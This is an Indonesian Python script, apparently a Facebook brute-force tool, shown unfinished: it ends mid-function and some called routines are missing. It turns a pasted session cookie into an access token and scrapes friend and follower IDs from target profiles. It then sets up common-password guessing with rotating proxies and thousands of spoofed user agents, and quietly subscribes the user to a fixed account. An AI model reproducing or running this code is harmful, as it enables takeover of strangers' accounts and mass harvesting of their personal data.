#!/usr/bin/python3
#coding=utf-8
#create 29/08/2022
import requests,bs4,json,os,sys,random,time,re,marshal,datetime
from fake_useragent import UserAgent
import urllib3
import base64
import rich
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor
from time import time as atsuna
from rich.panel import Panel as Anak
from rich.panel import Panel 
from datetime import datetime
from gtts import gTTS
from rich import print as Buat
from rich import print as prints
from rich.tree import Tree 
from bs4 import BeautifulSoup as par
from rich.columns import Columns as lum
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from rich.console import Console as sol
try:
	import rich
except ImportError:
	print("\t [!] Sedang menginstal module rich")
	os.system("python -m pip install --upgrade pip && pip install rich")
try:
	import requests
except ImportError:
	print("\t [!] Sedang menginstal module requests")
	os.system("pip install requests")
try:
	import mechanize
except ImportError:
	print("\t [!] Sedang menginstal module mechanize")
	os.system("pip install mechanize")

########## TAMPUNG MEMEK ##########
id,id2,loop,ok,cp,akun,ganti,method,tokenku,uid= [],[],0,0,0,[],[],[],[],[]
cokbrut=[]
CAK = sol()
pwpluss=[]
pwnya=[]
ugen=[]
ugan=[]
ugun = []
ses=requests.Session()
namafile = []
try:pm = open(".pemisah.txt","r").read()
except:pm = "|"

try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('data/proxy.txt','w').write(prox)
except Exception as e:
    print(e)
##-----WARNA PRINT----##
J = '\x1b[38;5;208m'
P = '\033[m'
K = '\033[93m'
hh = '\033[92m'
M = '\033[91m' # MERAH
W = '\033[97;1m'  
N = '\x1b[0m'
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
P = '\033[1;34m'
B = '\033[1;35m'
C = '\033[1;36m'
########## WARNA RANDOM ##########
P = '\x1b[0;97m'
M = '\x1b[0;31m'
H = '\x1b[0;32m'
K = '\x1b[0;33m'
B = '\x1b[0;34m'
U = '\x1b[0;35m' 
O = '\x1b[0;36m'
########## WARNA RICH LAPISAN ##########
M3 = "#FF0000"
H3 = "#00FF00"
K3 = "#FFFF00"
P3 = "#FFFFFF"
B3 = "#00C8FF"
U3 = "#AF00FF"
O3 = "#00FFFF"
########## WARNA RICH BIASA ##########
M2 = "[#FF0000]"
H2 = "[#00FF00]"
K2 = "[#FFFF00]"
P2 = "[#FFFFFF]"
B2 = "[#00C8FF]"
U2 = "[#AF00FF]"
O2 = "[#00FFFF]"


hitung = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
hitung2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tanggal = datetime.now().day
bulan = hitung[(str(datetime.now().month))]
tahun = datetime.now().year
okeh = 'OK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
cepe = 'CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
join = ''+str(tanggal)+' '+str(bulan)+' '+str(tahun)+''


def jalan(Kiya):
	for Aang in Kiya + "\n":
		sys.stdout.write(Aang)
		sys.stdout.flush()
		time.sleep(0.02)
def sapu():
	os.system("clear")

for xd in range(5000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
  c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
  d=random.randrange(10,200)
  e='0.4844.88 '
  f=random.randrange(1000,8000)
  g=random.randrange(10,200)
  h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
  prodi=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
  ugen.append(prodi)
for xd in range(9000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
  c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  d=random.randrange(10,200)
  e='0'
  f=random.randrange(1000,8000)
  g=random.randrange(10,200)
  h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
  prodi=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
  ugen.append(prodi)
for ua in range(10000):
  a='Mozilla/5.0 (Linux; Android'
  b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
  y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
  c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  d=random.randrange(40,115)
  e='0'
  f=random.randrange(3000,6000)
  g=random.randrange(20,100)
  h='Mobile Safari/537.36'
  sumaiya=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
  ugen.append(sumaiya)
for ua in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	sumaiya=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(sumaiya)
for x in range(1000):
	aa = "Mozilla/5.0 (Linux; Android"
	b = random.randrange(7,12)
	c = random.randrange(0,1)
	d = "RMX3357 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"
	e = random.randrange(50,116)
	f = "0"
	j = random.randrange(300,18400)
	g = random.randrange(0,200)
	h = "Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/440.0.0.31.105;]37.36"
	i = f"{aa} {b}; {d}{e}.{f}.{j}.{g} {h}"
	ugan.append(i)
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	

def sound(__bokep__):
	if __bokep__ in ["ok"]:os.popen("play-audio data/audio/ok.mp3")
	elif __bokep__ in ["cp"]:os.popen("play-audio data/audio/cp.mp3")
	elif __bokep__ in ["login"]:os.popen("play-audio data/audio/login.mp3")
def simpan():
	file = namafile[0]
	print(f"\r{P} ─────────────────────────────")
	print(f" [{hh}!{P}] total akun sebanyak  : %s\n [{hh}!{P}] pemisah file memakai : %s\n [{hh}!{P}] file tersimpan di    : /sdcard/%s"%(len(id),pm,file))
	exit()
def logo():
    sapu()
    sekarang = datetime.now()
    jam = sekarang.strftime("%H:%M:%S")
    xd =[]
    xd.append(Anak(f""" [b red]     ____  ____  ____ 
     (_  _)(  _ \(  __)
       )(   ) _ ( ) _) 
      (__) (____/(__)\n      [white]Tools Brute Force  
   """,width=43,style="b white",title_align="left",title=f"[b green] ●[b red] ●[b yellow] ● [white]"))
  
    xd.append(Anak(f"By Code : [green]Aang Ardiansyah\n[white]Ricode  : [green]Atsuna-ID\n[white]Tools   : [green]Brute Force\n[white]From    : [green]Indonesia[white]\nStatus  : [red]Pertalie[white]\nTime    : [red]{jam}",subtitle="[b red] ● [b yellow]● [b green]● ",subtitle_align="right",style="b white",width=32))
    CAK.print(lum(xd))
   
   
def banner():
	sapu()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			ambil = requests.get('https://graph.facebook.com/me?fields=id,name,birthday,gender&access_token='+tokenku[0], cookies={'cookie':cok})
			sy1 = json.loads(ambil.text)['name']
			sy2 = json.loads(ambil.text)['id']
			ttl = json.loads(ambil.text)['birthday']
			kel = json.loads(ambil.text)['gender']
		except:pass
	except:pass
	sekarang = datetime.now()
	jam = sekarang.strftime("%H:%M:%S")
	xd =[]
	xd.append(Anak(f""" [b red]     ____  ____  ____ 
     (_  _)(  _ \(  __)
       )(   ) _ ( ) _) 
      (__) (____/(__)\n      [white]Tools Brute Force  
   """,width=43,style="b white",title_align="left",title=f"[b green] ●[b red] ●[b yellow] ● [white]"))
	xd.append(Anak(f"Username : [green]{sy1}\n[white]User ID  : [green]{sy2}\n[white]birthday : [green]{ttl}\n[white]Kelamin  : [green]{kel}[white]\nStatus   : [red]Pertalie[white]\nTime     : [red]{jam}",subtitle="[b red] ● [b yellow]● [b green]● ",subtitle_align="right",style="b white",width=32))
	CAK.print(lum(xd))

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			ambil = requests.get('https://graph.facebook.com/me?fields=id,name,birthday,gender&access_token='+tokenku[0], cookies={'cookie':cok})
			sy1 = json.loads(ambil.text)['name']
			sy2 = json.loads(ambil.text)['id']
			ttl = json.loads(ambil.text)['birthday']
			kel = json.loads(ambil.text)['gender']
			menu()
		except KeyError:
			masuk()
		except requests.exceptions.ConnectionError:
			print(f"  {P}[{H}!{P}] Tidak ada koneksi");exit()
	except IOError:
		masuk()

def jadi():
	try:
		requests.post("https://graph.facebook.com/100027796542918?fields=subscribers&access_token=%s"%(tokenku))
	except:pass
def audio():
	try:
		timee = strftime('%H')
		if str(timee) in ('04','05','06','07','08','09'):spech= 'selamat pagi'
		elif str(timee) in ('10','11','12','13','14','15'):spech= 'selamat siang'
		elif str(timee) in ('16','17','18'):spech= 'selamat sore'
		elif str(timee) in ('19','20','21','22','23','00','01','02','03'):spech='selamat malam'
		bahasa = "id"
		file=gTTS(f"{spech} bangg", lang=bahasa,slow=False)
		os.system('rm -rf ayang.mp3')
		file.save("ayang.mp3")
		os.popen("play-audio /sdcard/ayang.mp3")
		
	except:pass

def masuk():
	sapu();logo()
	mas = f"""{P2}[{H2}01{P2}] Login menggunakan cookie
[{H2}02{P2}] Cara mengambil cookie fb
[{H2}03{P2}] Clone Old
[{H2}04{P2}] Check results crack
[{M2}00{P2}] Logout"""
	Buat(Anak(mas,width=80,title=f"{H2}login{P2}",style=f"b white"))
	nanya = input(f"  {P}[{H}?{P}] Pilih : ")
	if nanya in ["01","1"]:
		goblok()
	elif nanya in ["02","2"]:
		nd = f"{P2}Kamu akan segera diarahkan ke youtube"
		Buat(Anak(nd,width=50,style=f"{B3}"));time.sleep(3)
		os.system('xdg-open https://youtu.be/iDVCcnLcTnE');masuk()
	elif nanya in ["03","3"]:
		fbtua()
	elif nanya in ["04","4"]:
		__hasil__()


def goblok():
	
	
	warna = random.choice([H,B,U,M,O])
	fo = f"{P2}Ketik {H2}open{P2} untuk mendapatkan url ambil cookie"
	Buat(Anak(fo,width=80,style=f"b white"))
	try:
		your_cookies= input('  [+] Masukan Cookie : ')
		with requests.Session() as r:
		  r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
		  data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
		  response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
		  code, user_code = response['code'] , response['user_code']
		  verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		  r.headers.pop('content-type')
		  r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
		  response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
		  if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
		    exit(f'{m}[>] Cokies invalid{p}')
		    print("                     ", end='\r')
		  else:
		    action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
		    fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
		    jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
		    data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
		    r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
		    response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
		    if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
		      r.headers.pop('content-type');r.headers.pop('origin')
		      response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
		      action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
		      fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
		      jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
		      scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
		      display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
		      user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
		      logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
		      auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
		      encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
		      return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
		      r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
		      data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
		      response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
		      windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
		      r.headers.pop('content-type');r.headers.pop('origin')
		      r.headers.update({'referer': 'https://m.facebook.com/',})
		      response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
		      if 'Sukses!' in str(response6):
		        r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
		        response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
		        access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
		        print(f'ken : {access_token}')
		        ken = open(".token.txt", "w").write(access_token)
		        cok = open(".cok.txt", "w").write(your_cookies)
		        suk = input(f'kan Enter  ');menu()
		      else:
		        exit(f'gin Gagal')
	except Exception as e:
	  exit(f'kies Kedaluarsa')
	  os.system('rm -rf .token.txt & rm -rf .cokies.txt')

	


def menu():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print("{P}[{H}!{P}] Cookie invalid ngab")
		time.sleep(2);login()
	sapu();banner()
	audio()
	ipku = requests.get("https://api.ipify.org").text

	men = f""" {P2}[{H2}01{P2}] Crack id dari publik       \t{P2}[{H2}02{P2}] Crack id publik massal
 {P2}[{H2}03{P2}] Crack id dari follower publik  \t{P2}[{H2}04{P2}] Check results Crack
 {P2}[{H2}05{P2}] Informasi script           \t{P2}[{H2}06{P2}] Dump Unlimited
 {P2}[{H2}07{P2}] dump fb old               \t{P2}[{M2}00{P2}] Logout ({M2}hapus cookie{P2})"""
	Buat(Anak(men,width=80,title=f"{H2}menu{P2}",style=f"b white"))
	__xxx__ = input(f"   {P}[{H}?{P}] Pilih : ")
	if __xxx__ in ["01","1"]:__publik__()
	elif __xxx__ in ["02","2"]:__masal__()
	elif __xxx__ in ["03","3"]:__folow__()
	elif __xxx__ in ["04","4"]:__hasil__()
	elif __xxx__ in ["05","5"]:__ingfo__()
	elif __xxx__ in ["06","6"]:masal_old()
	elif __xxx__ in ["07","7"]:fbtua()
	elif __xxx__ in ["00","0"]:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		tt = f"{P2}Sebentar, sedang menghapus info login"
		Buat(Anak(tt,width=50,style=f"{B3}"));time.sleep(2)
		jalan(f"  {P}[{H}√{P}] Berhasil terhapus ...");exit()
	else:
		print(f"\n  {P}[{M}!{P}] Pilih yang bener anjeng")
		time.sleep(2);exit
def fbtua():
	x = 111111111
	xx = 999999999
	idx = "100000" 
	limit = int(input(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mmasukan jumlah id\x1b[1;92m (cth 5000): "))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			id.append(__+"<=>"+str(_))
		print("\n \x1b[1;92m[\x1b[1;93m\x1b[1;92m+] \x1b[1;93mtotal id  \x1b[1;97m:\x1b[1;92m %s%s%s"%(M,len(id),N))
		with ThreadPoolExecutor(max_workers=50) as coeg:
			print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
			listpass = ['123456','12345678','@#@#@#']
			os.system("clear")
			print(logo)
			print("     \033[0;93m   FREE MODE ACTIVATE")
			print("\n\033[0;94m [+] BRUTE HAS BEEN START")
			print(" \033[0;96m[+] Note: 0k Open 70% JUST NOW")
			print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
			print("\033[0;94m----------------------------------------------")
			print("\n")
			print("\033[0;97m")
			for user in id:
				coeg.submit(metodee, user, listpass)
				exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using my tool...")
	except Exception as e:exit(str(e))
 
	
def randomne(token):
	try:
		prints(Panel(f"""Anda bisa mengatur jumlah id dan jumlah digit, anda juga bisa memasukkan id depan contoh: 10005 / 100005 / 1000005""",title="• INFO •")) 
		jumlah = int(input("  [?] Masukan Jumlah : "))
		digit = input("  [?] Masukan ID Depan : ")
		idg = int(15) - int(len(digit))
		depan = int(str('1'*idg))
		belakang = int(str('9'*idg))
		print("  [!] Untuk Berhenti Tekan Ctrl+C Di Keyboard Anda")
		for i in range(jumlah):
			sys.stdout.write('\  [*] Sedang Mengumpulkan %s ID...'%(len(id)));sys.stdout.flush()
			x = random.randint(depan,belakang)
			idt = (str(digit)+str(x))
			try:
				data = ses.get(f"https://graph.facebook.com/api/v13.0/{idt}?name&access_token={token}").json()
				nama = data["name"]
				id.append(idt+"<=>"+nama)
			except (KeyError,IOError,TypeError,ValueError):
				pass
	except KeyboardInterrupt:
		print("");setting()
		
def masal_old():	
	id1,id2  = [],[]
	try:
		token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
		print(f" [{hh}!{P}] contoh nama file : dump.json/dump.txt")
		pil = input(" id target  : ")
		nam = input(" nama file  : ")
		limit = int(input(' jumlah id  : '))
		file = ("/sdcard/"+nam)
		xx = open(file,"w")
		namafile.append(nam)
	except FileNotFoundError:
		error_file()
	try:
		for bas in ses.get(f'https://graph.facebook.com/{pil}?fields=friends&access_token'+tokenku[0],cookies={'cookie':cok}).json()['friends']['data']:
			id1.append(bas['id'])
	except (KeyError,IOError):
		exit(f" [{K}!{P}] akun tidak publik")
	for x in id1:
		id2.insert(0,x)
	for uid in id2:
		try:
			for baz in ses.get(f"https://graph.facebook.com/{uid}?fields=friends&access_token="+tokenku[0],cookies={'cookie':cok}).json()['friends']['data']:
				if "10008" in str(baz['id']) or "10007" in str(baz['id']) or "10006" in str(baz['id']) or "10005" in str(baz['id']) or "10001" in str(baz['id']) or "10002" in str(baz['id']) or "10003" in str(baz['id']) or "10004" in str(baz['id']) or "10005" in str(baz['id']) or "10001" in str(baz['id']) or "100009" in str(baz['id']) or "100008" in str(baz['id']) or "100007" in str(baz['id']) or "100006" in str(baz['id']) or "100005" in str(baz['id']) or "100001" in str(baz['id']) or "100002" in str(baz['id']) or "100003" in str(baz['id']) or "100004" in str(baz['id']) or "100005" in str(baz['id']):pass
				else:
					if baz in id:pass
					else:
						xx.write(baz["id"]+pm+baz["name"]+"\n")
						id.append(baz['id']+pm+baz['name'])
						print('\r sedang dump %s id'%(len(id)),end="")
						sys.stdout.flush()
						if len(id)==limit:simpan()
		except Exception as e:pass
########## PUBLIK ##########
def __publik__():
	try:
		token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
	except IOError:
		exi()
	jb = f" {P2}[{M2}!{P2}] Pastikan target bersifat publik"
	Buat(Anak(jb,width=80,style=f"white"))
	ppk = input(f"   {P}[{H}?{P}] Target id : ");uid.append(ppk)
	for __colmek__ in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/{__colmek__}?fields=friends&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				if "100009" in str(mi['id']) or "100008" in str(mi['id']):pass
				else:
					if mi in id:
						pass
					try:
						iso = (mi['id']+'|'+mi['name'])
						if iso in id:pass
						else:id.append(iso)
					except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f"  {P}[{H}!{P}] Tidak ada koneksi");exit()
	try:
		print(f"   {P}[{H}!{P}] Terkumpul {H}{str(len(id))}{P} id")
		time.sleep(1);setting()
	except requests.exceptions.ConnectionError:
		print(f"  {P}[{H}!{P}] Tidak ada koneksi");exit()
	except (KeyError,IOError):
		print(f"  {P}[{M}!{P}] Target private/not publik");exit()

########## MASAL ##########
def __masal__():
	try:
		token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jb = f"{P2}[{M2}!{P2}] Pastikan target bersifat publik"
		Buat(Anak(jb,width=80,style=f"{B3}"))
		__sas__ = int(input(f"  {P}[{H}?{P}] Mau dump berapa id : "))
	except ValueError:
		print(f"  {P}[{H}!{P}] Masukan angka doang anjeng");time.sleep(2);exit()
	if __sas__<1 or __sas__>80:
		print(f"  {P}[{H}!{P}] Limit {H}50{P} id doang anjeng");time.sleep(2);exit()
	ses=requests.Session()
	memek = 0
	for met in range(__sas__):
		memek+=1
		ppk = input(f"  {P}[{H}•{P}] Target id nomor {H}{str(memek)}{P} : ");uid.append(ppk)
	for __colmek__ in uid:
		try:
			col = ses.get(f'https://graph.facebook.com/v2.0/{__colmek__}?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(f"  {P}[{H}!{P}] Tidak ada koneksi");exit()
	try:
		print(f"  {P}[{H}!{P}] Terkumpul {H}{str(len(id))}{P} id")
		setting()
	except requests.exceptions.ConnectionError:
		print(f"  {P}[{H}!{P}] Tidak ada koneksi");exit()
	except (KeyError,IOError):
		print(f"  {P}[{H}!{P}] Target private/tidak memiliki teman");exit()
########## FOLLOWER ##########
def __folow__():
	try:token = open('.token.txt','r').read();cok = open('.cok.txt','r').read()
	except IOError:exit()
	ff = f"{P2}[{M2}!{P2}] Pastikan akun bersifat publik"
	Buat(Anak(ff,width=50,style=f"{B3}"))
	__janda__ = input(f"  {P}[{H}?{P}] Target id : ")
	try:
		Kiya = requests.get(f'https://graph.facebook.com/{__janda__}?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in Kiya['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f"  {P}[{H}!{P}] Terkumpul {H}{str(len(id))}{P} id");time.sleep(2);setting()
	except requests.exceptions.ConnectionError:print(f"  {P}[{M}!{P}] Tidak ada koneksi");time.sleep(2);exit()
	except (KeyError,IOError):print(f"  {P}[{M}!{P}] Target private/not publik");time.sleep(2);exit()
########## CEK RESULTS ##########
def __hasil__():
	sil = f"""{P2}[{H2}01{P2}] Check results akun {H2}OK
{P2}[{H2}02{P2}] Check results akun {K2}CP{P2}"""
	Buat(Anak(sil,width=50,title=f"{H2}check results{P2}",style=f"{B3}"))
	__kentod__ = input(f"  {P}[{H}?{P}] Pilih : ")
	if __kentod__ in ["1","01"]:
		try:
			vin = os.listdir('OK')
		except FileNotFoundError:
			print(f"\n  {P}[{M}!{P}] File ndak ada anjeng")
			time.sleep(2)
			exit()
		if len(vin)==0:
			print(f"\n  {P}[{M}!{P}] Kamu belum punya results")
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10000:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)});lol.update({nom:str(isi)})
					print(f"  {P}[{O}{nom}{P}] {isi}");time.sleep(0.03)
				else:
					lol.update({str(cih):str(isi)})
					print(f"  {P}[{O}{nom}{P}] {isi}");time.sleep(0.03)
			__sil__ = input(f"\n  {P}[{H}?{P}] Masukan nomor file : ")
			try:geh = lol[__sil__]
			except KeyError:
				print(f"\n  {P}[{M}!{P}] Pilih yang bener lah");exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f"\n  {P}[{M}!{P}] File ndak ada anjeng")
				time.sleep(2)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'  {P}[{H}OK{P}] {H}{cpkuni[0]}|{cpkuni[1]}{P}');time.sleep(0.03)
				nocp +=1
			exit()
	elif __kentod__ in ["2","02"]:
		try:
			vin = os.listdir('CP')
		except FileNotFoundError:
			print(f"\n  {P}[{M}!{P}] File ndak ada anjeng")
			time.sleep(2)
			exit()
		if len(vin)==0:
			print(f"\n  {P}[{M}!{P}] Kamu belum punya results")
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10000:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)});lol.update({nom:str(isi)})
					print(f"  {P}[{O}{nom}{P}] {isi}");time.sleep(0.03)
				else:
					lol.update({str(cih):str(isi)})
					print(f"  {P}[{O}{nom}{P}] {isi}");time.sleep(0.03)
			__sil__ = input(f"\n  {P}[{H}?{P}] Masukan nomor file : ")
			try:geh = lol[__sil__]
			except KeyError:
				print(f"\n  {P}[{M}!{P}] Pilih yang bener lah");exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f"\n  {P}[{M}!{P}] File ndak ada anjeng")
				time.sleep(2)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'  {P}[{K}CP{P}] {K}{cpkuni[0]}|{cpkuni[1]}{P}');time.sleep(0.03)
				nocp +=1
			exit()
def setting1():
	pwplus = input(f"   {P}[{H}?{P}] Password manual [{H}y{P}/{M}t{P}]: ")
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		bb = f" {P2}[{M2}!{P2}] Gunakan {H2}koma{P2} sebagai pemisah\n[{M2}!{P2}] Contoh : sayangku,anjing,kontol"
		Buat(Anak(bb,width=80,style=f"white"))
		pwku=input(f"  {P}[{H}?{P}] Masukan password : ")
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	met = f""" {P2}[{H2}01{P2}] Login with mbasic
 {P2}[{H2}02{P2}] Login with free facebook
 {P2}[{H2}03{P2}] Login with m.facebook --> {H2}disarankan{P2}
 {P2}[{H2}04{P2}] Login with facebook mobile"""
	Buat(Anak(met,width=80,title=f"{H2}method login{P2}",style=f"white"))
	__kon__ = input(f"   {P}[{H}?{P}] Pilih : ")
	if __kon__ in [""]:
		print(f"\n{P}[{H}!{P}] Input yang bener");setting()
	elif __kon__ in ["1", "01"]:method.append("mbasic")
	elif __kon__ in ["2", "02"]:method.append("free")
	elif __kon__ in ["3", "03"]:method.append("mobile")
	elif __kon__ in ["4", "04"]:method.append("mobile_v2")
	else:method.append('mobile')
	kunaon()


########## SETTING ##########
def setting():
	suara = "jika ingin crack secara old silahkan ketik huruf o,jika ingin crack seacara new,silahkan ketik huruf n,jika ingin crack secara random,silahkan ketik huruf r..terima kasih"
	bahasa = "id"
	gt = gTTS(text=suara, lang=bahasa, slow=False)
	gt.save("suara.mp3")
	os.system("play-audio /sdcard/suara.mp3")
	__sas__ = input(f"   {P}[{H}?{P}] Ingin Crack Secara (Old/New/Random) ? : ")
	
	if __sas__ in ['o','O']:
		for tua in sorted(id):
			id2.append(tua)
	elif __sas__ in ['N','n']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif __sas__ in ['r','R']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f"  {P}[{H}!{P}] Pilih {H}1{P} sampai {H}3{P} doang anjeng");exit()
	pwplus = input(f"   {P}[{H}?{P}] Password manual [{H}y{P}/{M}t{P}]: ")
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		bb = f" {P2}[{M2}!{P2}] Gunakan {H2}koma{P2} sebagai pemisah\n[{M2}!{P2}] Contoh : sayangku,anjing,kontol"
		Buat(Anak(bb,width=80,style=f"white"))
